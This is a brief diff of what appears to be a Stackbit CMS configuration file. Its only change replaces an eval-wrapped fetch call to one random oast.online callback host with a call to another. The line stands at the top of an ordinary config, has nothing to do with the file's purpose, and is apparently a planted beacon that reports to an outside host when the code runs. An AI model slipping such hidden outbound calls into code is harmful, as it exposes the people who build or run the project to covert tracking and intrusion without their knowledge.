@@ -1,4 +1,4 @@
-const e = () => eval(`fetch(\`https://cpq8j7hucph8ppbne1hg594fzknjnnu5m.oast.online\`)`);
+const e = () => eval(`fetch(\`https://cpq9p1hucphf9m4gh1t0n5tbzsxkznk5x.oast.online\`)`);
 import { ObjectModel } from "@stackbit/types";
 
 import { ContentfulContentSource } from "@stackbit/cms-contentful";
